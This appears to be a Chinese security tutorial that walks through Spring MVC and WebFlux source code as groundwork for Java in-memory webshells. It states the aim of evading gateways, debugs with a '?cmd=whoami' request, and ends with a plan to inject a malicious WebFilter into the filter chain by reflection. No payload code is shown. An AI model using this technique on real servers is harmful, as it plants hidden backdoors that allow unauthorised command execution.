IOC（控制反转）容器是Spring框架的核心概念之一，它的基本思想是将对象的创建、组装、管理等控制权从应用程序代码反转到容器，使得应用程序组件无需直接管理它们的依赖关系。IOC容器主要负责对象的创建、依赖注入、生命周期管理和配置管理等。Spring框架提供了多种实现IOC容器的方式，下面讲两种常见的： BeanFactory：Spring的最基本的IOC容器，提供了基本的IOC功能，只有在第一次请求时才创建对象。 ApplicationContext：这是BeanFactory的扩展，提供了更多的企业级功能。ApplicationContext在容器启动时就预加载并初始化所有的单例对象，这样就可以提供更快的访问速度。 2.11.1 Spring MVC九大组件这九大组件需要有个印象： DispatcherServlet（派发Servlet）：负责将请求分发给其他组件，是整个Spring MVC流程的核心；HandlerMapping（处理器映射）：用于确定请求的处理器（Controller）；HandlerAdapter（处理器适配器）：将请求映射到合适的处理器方法，负责执行处理器方法；HandlerInterceptor（处理器拦截器）：允许对处理器的执行过程进行拦截和干预；Controller（控制器）：处理用户请求并返回适当的模型和视图；ModelAndView（模型和视图）：封装了处理器方法的执行结果，包括模型数据和视图信息；ViewResolver（视图解析器）：用于将逻辑视图名称解析为具体的视图对象；LocaleResolver（区域解析器）：处理区域信息，用于国际化；ThemeResolver（主题解析器）：用于解析Web应用的主题，实现界面主题的切换。 2.11.2 简单的源码分析2.11.2.1 九大组件的初始化首先是找到org.springframework.web.servlet.DispatcherServlet，可以看到里面有很多组件的定义和初始化函数以及一些其他的函数： 但是没有init()函数，我们翻看其父类FrameworkServlet的父类org.springframework.web.servlet.HttpServletBean的时候发现有init函数： 代码如下： 123456789101112131415161718192021222324@Overridepublic final void init() throws ServletException { // Set bean properties from init parameters. PropertyValues pvs = new ServletConfigPropertyValues(getServletConfig(), this.requiredProperties); if (!pvs.isEmpty()) { try { BeanWrapper bw = PropertyAccessorFactory.forBeanPropertyAccess(this); ResourceLoader resourceLoader = new ServletContextResourceLoader(getServletContext()); bw.registerCustomEditor(Resource.class, new ResourceEditor(resourceLoader, getEnvironment())); initBeanWrapper(bw); bw.setPropertyValues(pvs, true); } catch (BeansException ex) { if (logger.isErrorEnabled()) { logger.error(&quot;Failed to set bean properties on servlet '&quot; + getServletName() + &quot;'&quot;, ex); } throw ex; } } // Let subclasses do whatever initialization they like. initServletBean();} 先是从Servlet的配置中获取初始化参数并创建一个PropertyValues对象，然后设置Bean属性；关键在最后一步，调用了initServletBean这个方法。 我们点进去之后发现该函数并没有写任何内容，说明应该是子类继承的时候override了该方法： 果不其然，我们在org.springframework.web.servlet.FrameworkServlet中成功找到了该方法： 代码如下： 1234567891011121314151617181920212223242526272829@Overrideprotected final void initServletBean() throws ServletException { getServletContext().log(&quot;Initializing Spring &quot; + getClass().getSimpleName() + &quot; '&quot; + getServletName() + &quot;'&quot;); if (logger.isInfoEnabled()) { logger.info(&quot;Initializing Servlet '&quot; + getServletName() + &quot;'&quot;); } long startTime = System.currentTimeMillis(); try { this.webApplicationContext = initWebApplicationContext(); initFrameworkServlet(); } catch (ServletException | RuntimeException ex) { logger.error(&quot;Context initialization failed&quot;, ex); throw ex; } if (logger.isDebugEnabled()) { String value = this.enableLoggingRequestDetails ? &quot;shown which may lead to unsafe logging of potentially sensitive data&quot; : &quot;masked to prevent unsafe logging of potentially sensitive data&quot;; logger.debug(&quot;enableLoggingRequestDetails='&quot; + this.enableLoggingRequestDetails + &quot;': request parameters and headers will be &quot; + value); } if (logger.isInfoEnabled()) { logger.info(&quot;Completed initialization in &quot; + (System.currentTimeMillis() - startTime) + &quot; ms&quot;); }} 这段代码的log和计时部分就不说了，我们捡关键的说。它先是调用initWebApplicationContext方法，初始化IOC容器，在初始化的过程中，会调用到这个onRefresh方法，一般来说这个方法是在容器刷新完成后被调用的回调方法，它执行一些在应用程序启动后立即需要完成的任务： 跟入该方法，可以看到其中默认为空： 说明在它的子类中应该会有override，果然我们定位到了org.springframework.web.servlet.DispatcherServlet# 方法： 这一下就明了了起来，这不是我们之前提到的九大组件嘛，到这一步就完成了Spring MVC的九大组件的初始化。 2.11.2.2 url和Controller的关系的建立你可能会有这样的一个疑惑：我们是用@RequestMapping(&quot;/&quot;)注解在方法上的，那Spring MVC是怎么根据这个注解就把对应的请求和这个方法关联起来的？ 从上面的九大组件的初始化中可以看到，有个方法就叫做initHandlerMappings，我们点进去详细看看： 这段代码和自带的注释写的也比较通俗易懂，分为两部分，第一部分是去ApplicationContext（包括ancestor contexts）里面找所有实现了HandlerMappings接口的类，如果找到了至少一个符合条件的HandlerMapping bean，那就把它的值转化为列表，并按照Java的默认排序机制对它们进行排序，最后将排序后的列表赋值给 this.handlerMappings；那如果没有找到，this.handlerMappings就依然保持为null；如果不需要检测所有处理程序映射，那就尝试从ApplicationContext中获取名称为 handlerMapping 的bean，如果成功获取到了则将其作为单一元素的列表赋值给 this.handlerMappings，如果获取失败了，那也没关系，因为人家注释里面讲的很明白，会添加一个默认的HandlerMapping，这也就是我们要讲的第二部分的代码。 第二部分说的是，如果之前一套操作下来，this.handlerMappings还是为null，那么就调用 getDefaultStrategies 方法去获取默认的HandlerMapping，并将其赋给 this.handlerMappings。 这么一看的话，org.springframework.web.servlet.DispatcherServlet#getDefaultStrategies这个方法还是挺关键的，我们点进去看看： 这段代码挺有意思，先是加载资源文件，并将其内容以属性键值对的形式存储在defaultStrategies中；接下来从strategyInterface获取一个名称，然后用这个名称在defaultStrategies中查找相应的值，如果找到了，就将这个值按逗号分隔成类名数组，接着遍历这个类名数组，对于每个类名都执行以下两个操作：①尝试通过ClassUtils.forName方法加载该类 ②使用createDefaultStrategy方法创建该类的实例；最后将创建的策略对象添加到列表strategies中并返回。 那就很好奇了，这段代码中的DEFAULT_STRATEGIES_PATH里面有啥？Ctrl+左键追踪： 原来是一个名叫DispatcherServlet.properties的文件，我们可以在左侧的依赖列表里面很快地翻到它，因为它应该是和DispatcherServlet.java在一块儿的： 从文件内容中，我们可以很快地锁定关键信息： 123org.springframework.web.servlet.HandlerMapping=org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping,\\ org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping,\\ org.springframework.web.servlet.function.support.RouterFunctionMapping 也就是说，会有三个值，分别是BeanNameUrlHandlerMapping、RequestMappingHandlerMapping和RouterFunctionMapping，我们一般用的是第二个，我们点进org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping看一下： 它的父类RequestMappingInfoHandlerMapping的父类AbstractHandlerMethodMapping实现了InitializingBean这个接口，这个接口用于在bean初始化完成后执行一些特定的自定义初始化逻辑。 点进该接口，只有一个afterPropertiesSet方法，关于该方法的用途可以参考https://www.python100.com/html/U711CO7MV79C.html： 那我们就看看AbstractHandlerMethodMapping它是具体咋实现InitializingBean的afterPropertiesSet的吧： 重写的也很简单，调用initHandlerMethods这个方法，继续跟踪该方法： 注释里面写的很清楚：扫描ApplicationContext中的bean，然后检测并注册handler methods。 我们在org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#initHandlerMethods这里打下断点进行调试，到图中这一步之后step into： 我们来看org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#processCandidateBean这个方法的具体逻辑： 这里我们自然很好奇，这个isHandler是判断啥的，我们点进去看看： 可以看到，这里并没有给出实现，说明子类中应该会给出override，于是直接找到了org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#isHandler： 很明显，isHandler是用来检测给定的beanType类是否带有Controller注解或者RequestMapping注解。 解决了这个，继续往后看，后面是调用了detectHandlerMethods这个方法，我们点进去看看： 我们分开来看，首先是这行代码，它是综合起来写的，意思是说，先判断handler是否是字符串类型，如果是，则通过ApplicationContext获取它的类型；否则，直接获取handler的类型。： 12Class&lt;?&gt; handlerType = (handler instanceof String ? obtainApplicationContext().getType((String) handler) : handler.getClass()); 然后是这部分： 1234567891011Class&lt;?&gt; userType = ClassUtils.getUserClass(handlerType);Map&lt;Method, T&gt; methods = MethodIntrospector.selectMethods(userType, (MethodIntrospector.MetadataLookup&lt;T&gt;) method -&gt; { try { return getMappingForMethod(method, userType); } catch (Throwable ex) { throw new IllegalStateException(&quot;Invalid mapping on handler class [&quot; + userType.getName() + &quot;]: &quot; + method, ex); } }); 先是获取处理器的用户类，用户类是没有经过代理包装的类，这样就可以确保获取到的是实际处理请求的类；然后是这个selectMethods方法，这个方法有两个参数，第一个参数就是用户类，第二个参数是一个回调函数。关键就在于理解这个回调函数的作用。对于每个方法，它会尝试调用getMappingForMethod来获取方法的映射信息。 我们点进这个方法，发现它是一个抽象方法： 那就去看看他的子类中有没有对应的实现，直接定位到org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#getMappingForMethod： 我们在下图所示位置打断点调试： 分开来看，首先是第一行： 1RequestMappingInfo info = createRequestMappingInfo(method); 解析Controller类的方法中的注解，生成一个对应的RequestMappingInfo对象。我们可以step into进入org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#createRequestMappingInfo(java.lang.reflect.AnnotatedElement)方法： 可以看到这个info里面保存了访问该方法的url pattern是&quot;/&quot;，也就是我们在TestController.java所想要看到的当@RequestMapping(&quot;/&quot;)时，调用test方法。 继续一步步往下走，可以看到走到了org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#detectHandlerMethods的最后： 直接看lambda表达式里面的内容： 12Method invocableMethod = AopUtils.selectInvocableMethod(method, userType);registerHandlerMethod(handler, invocableMethod, mapping); 意思是，先用selectInvocableMethod方法根据method和userType选择出一个可调用的方法，这样是为了处理可能存在的代理和AOP的情况，确保获取到的是可直接调用的原始方法；然后把bean、Method和RequestMappingInfo注册进MappingRegistry。 到这里，url和Controller之间的关系是如何建立的问题就解决了。 2.11.2.3 Spring Interceptor引入与执行流程分析我们回顾之前聊到的Controller的思路和下面的4.1节中所展示的Controller内存马，可以考虑到这样一个问题： 随着微服务部署技术的迭代演进，大型业务系统在到达真正的应用服务器的时候，会经过一些系列的网关、复杂均衡以及防火墙等。所以如果你新建的shell路由不在这些网关的白名单中，那么就很有可能无法访问到，在到达应用服务器之前就会被丢弃。我们要达到的目的就是在访问正常的业务地址之前，就能执行我们的代码。所以，在注入java内存马时，尽量不要使用新的路由来专门处理我们注入的webshell逻辑，最好是在每一次请求到达真正的业务逻辑前，都能提前进行我们webshell逻辑的处理。在tomcat容器下，有filter、listener等技术可以达到上述要求。那么在 spring 框架层面下，有办法达到上面所说的效果吗？ ——摘编自https://github.com/Y4tacker/JavaSec/blob/main/5.内存马学习/Spring/利用intercetor注入Spring内存马/index.md和https://landgrey.me/blog/19/ 答案是当然有，这就是我们要讲的Spring Interceptor，Spring框架中的一种拦截器机制。 那就不禁要问了：这个Spring Interceptor和我们之前所说的Filter的区别是啥？ 参考：https://developer.aliyun.com/article/925400 主要有以下六个方面： 主要区别 拦截器 过滤器 机制 Java反射机制 函数回调 是否依赖Servlet容器 不依赖 依赖 作用范围 对action请求起作用 对几乎所有请求起作用 是否可以访问上下文和值栈 可以访问 不能访问 调用次数 可以多次被调用 在容器初始化时只被调用一次 IOC容器中的访问 可以获取IOC容器中的各个bean（基于FactoryBean接口） 不能在IOC容器中获取bean 我们在2.10.2节中给出的TestInterceptor.java的preHandle函数这里下断点，然后访问http://127.0.0.1:8080/?cmd=whoami进入调试： 一步步步入调试之后，发现进入org.springframework.web.servlet.DispatcherServlet#doDispatch方法： 我们在doDispatch方法的第一行下断点，重新访问页面调试： 看到了调用了getHandler这个函数，它的注释写的简单易懂：确定处理当前请求的handler，我们step into看看： 通过遍历当前handlerMapping数组中的handler对象，来判断哪个handler来处理当前的request对象： 继续步入这个函数里面所用到的mapping.getHandler方法，也就是org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler： 代码简单易懂，先是通过getHandlerInternal来获取，如果获取不到，那就调用getDefaultHandler来获取默认的，如果还是获取不到，就直接返回null；然后检查handler是不是一个字符串，如果是，说明可能是一个Bean的名字，这样的话就通过ApplicationContext来获取对应名字的Bean对象，这样就确保 handler 最终会是一个合法的处理器对象；接着检查是否已经有缓存的请求路径，如果没有缓存就调用 initLookupPath(request) 方法来初始化请求路径的查找；最后通过 getHandlerExecutionChain 方法创建一个处理器执行链。 这么看下来，这个getHandlerExecutionChain方法很重要，我们步入看看： 遍历adaptedInterceptors，判断拦截器是否是MappedInterceptor类型，如果是那就看MappedInterceptor是否匹配当前请求，如果匹配则将其实际的拦截器添加到执行链中，如果不是这个类型的那就直接将拦截器添加到执行链中。 再回到之前的getHandler方法中来，看看它的后半段： 主要都是处理跨域资源共享（CORS）的逻辑，只需要知道在涉及CORS的时候把request、executionChain和CORS配置通过getCorsHandlerExecutionChain调用封装后返回就行了。 一步步执行回到一开始的getHandler中，这里就是调用org.springframework.web.servlet.HandlerExecutionChain#applyPreHandle方法来遍历所有拦截器进行预处理，后面的代码就基本不需要了解了： 2.12 Spring WebFlux介绍与代码调试分析SpringWebFlux是Spring Framework 5.0中引入的新的响应式web框架。传统的Spring MVC在处理请求时是阻塞的，即每个请求都会占用一个线程，如果有大量请求同时到达，就需要大量线程来处理，可能导致资源耗尽。为了解决这个问题，WebFlux引入了非阻塞的响应式编程模型，通过使用异步非阻塞的方式处理请求，能够更高效地支持大量并发请求，提高系统的吞吐量；并且它能够轻松处理长连接和WebSocket，适用于需要保持连接的应用场景，如实时通讯和推送服务；在微服务架构中，服务之间的通信往往需要高效处理，WebFlux可以更好地适应这种异步通信的需求。 关于Reactive和Spring WebFlux的相关知识，可以参考知乎上的这篇文章，讲的通俗易懂，很透彻： https://zhuanlan.zhihu.com/p/559158740 WebFlux框架开发的接口返回类型必须是Mono&lt;T&gt;或者是Flux&lt;T&gt;。因此我们第一个需要了解的就是什么是Mono以及什么是Flux。 2.12.1 什么是Mono？Mono用来表示包含0或1个元素的异步序列，它是一种异步的、可组合的、能够处理异步数据流的类型。比方说当我们发起一个异步的数据库查询、网络调用或其他异步操作时，该操作的结果可以包装在Mono中，这样就使得我们可以以响应式的方式处理异步结果，而不是去阻塞线程等待结果返回，就像我们在2.10.3节中的那张gif图中所看到的那样。 下面我们来看看Mono常用的api： API 说明 代码示例 Mono.just(T data) 创建一个包含指定数据的 Mono。 Mono&lt;String&gt; mono = Mono.just(&quot;Hello, Mono!&quot;); Mono.empty() 创建一个空的 Mono。 Mono&lt;Object&gt; emptyMono = Mono.empty(); Mono.error(Throwable error) 创建一个包含错误的 Mono。 Mono&lt;Object&gt; errorMono = Mono.error(new RuntimeException(&quot;Something went wrong&quot;)); Mono.fromCallable(Callable&lt;T&gt; supplier) 从 Callable 创建 Mono，表示可能抛出异常的异步操作。 Mono&lt;String&gt; resultMono = Mono.fromCallable(() -&gt; expensiveOperation()); Mono.fromRunnable(Runnable runnable) 从 Runnable 创建 Mono，表示没有返回值的异步操作。 Mono&lt;Void&gt; runnableMono = Mono.fromRunnable(() -&gt; performAsyncTask()); Mono.delay(Duration delay) 在指定的延迟后创建一个空的 Mono。 Mono&lt;Object&gt; delayedMono = Mono.delay(Duration.ofSeconds(2)).then(Mono.just(&quot;Delayed Result&quot;)); Mono.defer(Supplier&lt;? extends Mono&lt;? extends T&gt;&gt; supplier) 延迟创建 Mono，直到订阅时才调用供应商方法。 Mono&lt;String&gt; deferredMono = Mono.defer(() -&gt; Mono.just(&quot;Deferred Result&quot;)); Mono.whenDelayError(Iterable&lt;? extends Mono&lt;? extends T&gt;&gt; monos) 将一组 Mono 合并为一个 Mono，当其中一个出错时，继续等待其他的完成。 Mono&lt;String&gt; resultMono = Mono.whenDelayError(Arrays.asList(mono1, mono2, mono3)); Mono.map(Function&lt;? super T, ? extends V&gt; transformer) 对 Mono 中的元素进行映射。 Mono&lt;Integer&gt; resultMono = mono.map(s -&gt; s.length()); Mono.flatMap(Function&lt;? super T, ? extends Mono&lt;? extends V&gt;&gt; transformer) 对 Mono 中的元素进行异步映射。 Mono&lt;Integer&gt; resultMono = mono.flatMap(s -&gt; Mono.just(s.length())); Mono.filter(Predicate&lt;? super T&gt; tester) 过滤 Mono 中的元素。 Mono&lt;String&gt; filteredMono = mono.filter(s -&gt; s.length() &gt; 5); Mono.defaultIfEmpty(T defaultVal) 如果 Mono 为空，则使用默认值。 Mono&lt;String&gt; resultMono = mono.defaultIfEmpty(&quot;Default Value&quot;); Mono.onErrorResume(Function&lt;? super Throwable, ? extends Mono&lt;? extends T&gt;&gt; fallback) 在发生错误时提供一个备用的 Mono。 Mono&lt;String&gt; resultMono = mono.onErrorResume(e -&gt; Mono.just(&quot;Fallback Value&quot;)); Mono.doOnNext(Consumer&lt;? super T&gt; consumer) 在成功时执行操作，但不更改元素。 Mono&lt;String&gt; resultMono = mono.doOnNext(s -&gt; System.out.println(&quot;Received: &quot; + s)); Mono.doOnError(Consumer&lt;? super Throwable&gt; onError) 在发生错误时执行操作。 Mono&lt;String&gt; resultMono = mono.doOnError(e -&gt; System.err.println(&quot;Error: &quot; + e.getMessage())); Mono.doFinally(Consumer&lt;SignalType&gt; action) 无论成功还是出错都执行操作。 Mono&lt;String&gt; resultMono = mono.doFinally(signal -&gt; System.out.println(&quot;Processing finished: &quot; + signal)); 2.12.2 什么是Flux？Flux表示的是0到N个元素的异步序列，可以以异步的方式按照时间的推移逐个或一批一批地publish元素。也就是说，Flux允许在处理元素的过程中，不必等待所有元素都准备好，而是可以在它们准备好的时候立即推送给订阅者。这种异步的推送方式使得程序可以更灵活地处理元素的生成和消费，而不会阻塞执行线程。 下面是Flux常用的api： API 说明 代码示例 Flux.just 创建包含指定元素的Flux Flux&lt;String&gt; flux = Flux.just(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;); Flux.fromIterable 从Iterable创建Flux List&lt;String&gt; list = Arrays.asList(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;);Flux&lt;String&gt; flux = Flux.fromIterable(list); Flux.fromArray 从数组创建Flux String[] array = {&quot;A&quot;, &quot;B&quot;, &quot;C&quot;};Flux&lt;String&gt; flux = Flux.fromArray(array); Flux.empty 创建一个空的Flux Flux&lt;Object&gt; emptyFlux = Flux.empty(); Flux.error 创建一个包含错误的Flux Flux&lt;Object&gt; errorFlux = Flux.error(new RuntimeException(&quot;Something went wrong&quot;)); Flux.range 创建包含指定范围的整数序列的Flux Flux&lt;Integer&gt; rangeFlux = Flux.range(1, 5); Flux.interval 创建包含定期间隔的元素的Flux Flux&lt;Long&gt; intervalFlux = Flux.interval(Duration.ofSeconds(1)).take(5); Flux.merge 合并多个Flux，按照时间顺序交织元素 Flux&lt;String&gt; flux1 = Flux.just(&quot;A&quot;, &quot;B&quot;);Flux&lt;String&gt; flux2 = Flux.just(&quot;C&quot;, &quot;D&quot;);Flux&lt;String&gt; mergedFlux = Flux.merge(flux1, flux2); Flux.concat 连接多个Flux，按照顺序发布元素 Flux&lt;String&gt; flux1 = Flux.just(&quot;A&quot;, &quot;B&quot;);Flux&lt;String&gt; flux2 = Flux.just(&quot;C&quot;, &quot;D&quot;);Flux&lt;String&gt; concatenatedFlux = Flux.concat(flux1, flux2); Flux.zip 将多个Flux的元素进行配对，生成Tuple Flux&lt;String&gt; flux1 = Flux.just(&quot;A&quot;, &quot;B&quot;);Flux&lt;String&gt; flux2 = Flux.just(&quot;1&quot;, &quot;2&quot;);Flux&lt;Tuple2&lt;String, String&gt;&gt; zippedFlux = Flux.zip(flux1, flux2); Flux.filter 过滤满足条件的元素 Flux&lt;Integer&gt; numbers = Flux.range(1, 5);Flux&lt;Integer&gt; filteredFlux = numbers.filter(n -&gt; n % 2 == 0); Flux.map 转换每个元素的值 Flux&lt;String&gt; words = Flux.just(&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;);Flux&lt;Integer&gt; wordLengths = words.map(String::length); Flux.flatMap 将每个元素映射到一个Flux，并将结果平铺 Flux&lt;String&gt; letters = Flux.just(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;);Flux&lt;String&gt; flatMappedFlux = letters.flatMap(letter -&gt; Flux.just(letter, letter.toLowerCase())); 2.12.3 Spring WebFlux启动过程分析本来是想先用文字聊一堆关于Spring MVC和Spring WebFlux之间的区别的，但是这个已经被网上现有的不多的关于WebFlux的文章讲烂了，大家随便搜都可以搜到，皮毛性的东西纯属浪费时间，于是我们直接看代码，去深挖WebFlux的调用过程，从中我们自然可以发现这两者在调用过程中的类似和不同的地方。 我们直接在run方法这里下断点，然后直接step into： 一步步地step over之后，我们可以看到调用了org.springframework.boot.SpringApplication#createApplicationContext这个方法（前面的那些方法并不重要，直接略过就行）： 这个方法光听名字createApplicationContext，就感觉很重要，因为字面意思就是创建ApplicationContext，这正是我们感兴趣的内容，我们step into进去看看： 可以看到，是根据不同的webApplicationType去选择创建不同的context，比如我们这里的webApplicationType就是REACTIVE，也就是响应式的。 我们step into这里的create方法： 发现里面有两个静态方法、一个create方法和一个默认实现 DEFAULT，这个默认实现通过加载 ApplicationContextFactory 的所有候选实现，创建相应的上下文；如果没有找到合适的实现，则默认返回一个 AnnotationConfigApplicationContext 实例。 我们继续step over走下去，可以看到我们REACTIVE对应的context是AnnotationConfigReactiveWebServerApplicationContext： 继续往下走，我们会回到一开始这里，可以看到接下来会调用prepareContext、refreshContext和afterRefresh方法，这个过程就是一系列的初始化、监听的注册等操作： 我们step into这里的refreshContext方法： 接着step into这里的refresh方法： 进来之后，接着step into这里的refresh方法： 可以看到，这里调用了一个super.refresh，也就是父类的refresh方法： 我们继续step into查看，发现这里调用了onRefresh方法： 我们step into这里的onRefresh，发现它调用了关键的org.springframework.boot.web.reactive.context.ReactiveWebServerApplicationContext#createWebServer： 继续step over可以看到，由于我们使用的是Netty而不是Tomcat，因此这里最终会调用NettyReactiveWebServerFactory类中的getWebServer方法： 而上图中的WebServerManager类也是一个重要的封装类，里面有两个成员变量，一个是底层服务器的抽象WebServer，另一个是上层方法处理者的抽象DelayedInitializationHttpHandler： 那这个webserver具体是怎么启动的呢？我们继续走到finishRefresh这个方法这里来，如果这里我们直接无脑step over，程序最终会回到run方法，说明，启动webserver的地方肯定就在这个finishRefresh方法里面： 我们step into进去看看： 接着step into去看看这里调用的getLifecycleProcessor().onRefresh()方法，发现调用了startBeans方法，并且设置了自启动： 我们直接step into这个startBeans方法，一步步地step over过后，会发现调用了start方法，看来我们在逐渐逼近真相： 我们继续step into这个start方法，发现调用了org.springframework.context.support.DefaultLifecycleProcessor#doStart这个方法： 直接step into进去看看，发现由于dependenciesForBean为[]，所以没有调用doStart方法，直接就是调用bean.start()： 继续step into这个start方法看看： 怎么会啥也没有呢？奇了怪了，到底是哪里出了问题了呢？我在这一步愣住了，决定把之前打的断点取消，在如下俩图所示的位置打上断点重新调试，因为这两个方法是关键方法： 调试了几遍之后发现是我疏忽了，这里的this.lifecycleBeans里面其实有三个，每调用一次doStart方法就会删掉一个： 可以看到，我们刚才调用的是第一个bean的，所以当然没有启动webserver相关的方法了： 我们一步步step over，当memeber.name为webServerStartStop时，我们再step into这个doStart方法里面的bean.start()： 即可看到this.weServerManager.start()： 我们继续step into这个start方法： 仔细看看上面红框中的代码，先是初始化HttpHandler，这个方法其实根据lazyInit的值的不同来决定何时初始化，如果lazyInit值为true，那么就等第一次请求到来时才真正初始化；如果为false，那么就在 WebServerManager 的 start 方法中调用 initializeHandler 直接初始化： 我们继续步入这里的start方法，发现其位置为org.springframework.boot.web.embedded.netty.NettyWebServer#start 到这里才算真正明了，真正的webServer启动的关键方法是org.springframework.boot.web.embedded.netty.NettyWebServer#startHttpServer： 从下面的this.webServer中也可以看到，绑定的是0.0.0.0:9191： 2.12.4 Spring WebFlux请求处理过程分析当一个请求过来的时候，Spring WebFlux是如何进行处理的呢？ 这里我们在org.example.webfluxmemoryshelldemo.hello.GreetingHandler#hello这里打上断点，然后进行调试，访问http://127.0.0.1:9191/hello触发debug： 一步步地step over后来到org.springframework.web.reactive.DispatcherHandler#invokeHandler： step into之后可以看到是org.springframework.web.reactive.DispatcherHandler#handle： 解释上面代码中的return部分，首先检查handlerMappings是否为null，如果是，那就调用createNotFoundError方法返回一个表示未找到处理程序的Mono；接着通过CorsUtils.isPreFlightRequest方法检查是否为预检请求，如果是，那就调用handlePreFlight方法处理预检请求，如果不是预检请求且handlerMappings不为null，通过一系列的操作，获取到请求的handler，然后调用invokeHandler方法执行处理程序，再调用handleResult方法处理执行结果，最终返回一个表示处理完成的Mono。 左下角的Threads &amp; Variables这里，我们往下翻，可以看到在此之前是调用了一个org.springframework.web.reactive.handler.AbstractHandlerMapping#getHandler： 我们把之前的断点去掉，然后在该函数这里打上断点： 发现调用了org.springframework.web.reactive.handler.AbstractHandlerMapping#getHandlerInternal，我们再回去看，发现调用位置在org.springframework.web.reactive.function.server.support.RouterFunctionMapping#getHandlerInternal： 点击去： 这里最终创建的是DefaultServerRequest对象，需要注意的是在创建该对象时将RouterFunctionMapping中保存的HttpMessageReader列表作为参数传入，这样DefaultServerRequest对象就有了解析参数的能力。 回到getHandlerInternal这个函数，看它的return里面的匿名函数，发现其调用了org.springframework.web.reactive.function.server.RouterFunction#route，我们点进去看看： 发现只是在接口中定义了下： 于是去翻之前的Threads &amp; Variables： 首先调用this.predicate.test方法来判断传入的ServerRequest是否符合路由要求，如果匹配到了处理方法，那就将保存的HandlerFunction实现返回，否则就返回空的Mono。 点进去这个test方法，发现还是个接口，结合之前的RouterFunction.java和RouterFunctions.java的命名规则，合理猜测test方法的实现应该是在RequestPredicates.java里面。果然是有的，我们取消之前下的所有断点，在test函数这里重新打上断点后调试： 可以看到这里已经拿到了pattern，那就还差解析request里面的GET这个方法了： 我们继续step over，发现直接跳到了这里，我当时就挺纳闷儿，这里的this.left和this.right怎么就已知了： 这俩变量已知说明在执行test之前肯定是已经被赋值了，我继续往后step over，从下图中可以看到，此时二者之间多了个&amp;&amp;，不难猜测，应该是调用了org.springframework.web.reactive.function.server.RequestPredicates.AndRequestPredicate方法，因为还有一个OrRequestPredicate，这个or的话应该就是||了： 于是我们再在AndRequestPredicate方法这打上断点，此时我们还没有访问http://127.0.0.1:9191/hello，就已经触发调试了，这是因为我们在GreetingRouter.java里面写的代码中有GET方法、/hello路由还有and方法，因此会调用到AndRequestPredicate，并把GET和/hello分别复制给this.left和this.right： 到这里，我们基本就了解了路由匹配这么个事情。接下来我们要考虑的事情就是如何处理请求，这个就比较简单了，为什么这么说呢？因为在我们2.12.3节中的分析中已经基本涉及到了。我们还是在org.springframework.web.reactive.DispatcherHandler#invokeHandler打下断点调试： 可以看到，这里的this.handlerAdapters里面有四个handlerAdapter： 并不是所有的handlerAdapter都会触发handle方法，只有当支持我们给定的handler的handlerAdapter才可以调用： 然后我们step into这里的handlerAdapter.handle方法，发现是在org.springframework.web.reactive.function.server.support.HandlerFunctionAdapter#handle： 而这里的handlerFunction.handle也就是我们编写的route方法： 到这里，关于处理请求的部分也就完结了。 2.12.5 Spring WebFlux过滤器WebFilter运行过程分析对于Spring WebFlux而言，由于没有拦截器和监听器这个概念，要想实现权限验证和访问控制的话，就得使用Filter，关于这一部分知识可以参考Spring的官方文档： https://docs.spring.io/spring-security/reference/reactive/configuration/webflux.html 而在Spring Webflux中，存在两种类型的过滤器：一个是WebFilter，实现自org.springframework.web.server.WebFilter接口。通过实现这个接口，可以定义全局的过滤器，它可以在请求被路由到handler之前或者之后执行一些逻辑；另一个就是HandlerFilterFunction，它是一种函数式编程的过滤器类型，实现自org.springframework.web.reactive.function.server.HandlerFilterFunction接口，与WebFilter相比它更加注重函数式编程的风格，可以用于处理基于路由的过滤逻辑。 这里我们以WebFilter为例，看看它的运行过程。新建一个GreetingFilter.java，代码如下： 1234567891011121314151617181920212223package org.example.webfluxmemoryshelldemo.hello;import org.springframework.http.server.reactive.ServerHttpRequest;import org.springframework.stereotype.Component;import org.springframework.web.server.ServerWebExchange;import org.springframework.web.server.WebFilter;import org.springframework.web.server.WebFilterChain;import org.springframework.web.util.pattern.PathPattern;import org.springframework.web.util.pattern.PathPatternParser;import reactor.core.publisher.Mono;@Componentpublic class GreetingFilter implements WebFilter { @Override public Mono&lt;Void&gt; filter(ServerWebExchange serverWebExchange, WebFilterChain webFilterChain) { PathPattern pattern=new PathPatternParser().parse(&quot;/hello/**&quot;); ServerHttpRequest request=serverWebExchange.getRequest(); if (pattern.matches(request.getPath().pathWithinApplication())){ System.out.println(&quot;hello, this is our filter!&quot;); } return webFilterChain.filter(serverWebExchange); }} 效果如下： 我们直接在filter函数这里下断点，进行调试： 注意到return中调用了filter函数，于是step into看看： 可以看到是调用了invokeFilter函数。我们仔细看看这个DefaultWebFilterChain类： 可以看到是有三个名为DefaultWebFilterChain的函数，其中第一个是公共构造函数，第二个是私有构造函数（用来创建chain的中间节点），第三个是已经过时的构造函数。而在该类的注释中，有这样一句话： Each instance of this class represents one link in the chain. The public constructor DefaultWebFilterChain(WebHandler, List) initializes the full chain and represents its first link. 也就是说，通过调用 DefaultWebFilterChain 类的公共构造函数，我们初始化了一个完整的过滤器链，其中的每个实例都代表链中的一个link，而不是一个chain，这就意味着我们无法通过修改下图中的chain.allFilters来实现新增Filter： 但是这个类里面有个initChain方法用来初始化过滤器链，这个方法里面调用的是这个私有构造方法： 那我们就看看这个公共构造方法是在哪里调用的： 光标移至该方法，按两下Ctrl+Alt+F7： 调用的地方位于org.springframework.web.server.handler.FilteringWebHandler#FilteringWebHandler： 那思路就来了，我们只需要构造一个DefaultWebFilterChain对象，，然后把它通过反射写入到FilteringWebHandler类对象的chain属性中就可以了。 那现在就剩下传入handler和filters这两个参数了，这个handler参数很好搞，就在chain里面： 然后这个filters的话，我们可以先获取到它本来的filters，然后把我们自己写的恶意filter放进去，放到第一位，就可以了。 那现在就是从内存中找到DefaultWebFilterChain的位置，然后一步步反射就行。这里直接使用工具https://github.com/c0ny1/java-object-searcher，克隆下来该项目，放到idea中mvn clean install： 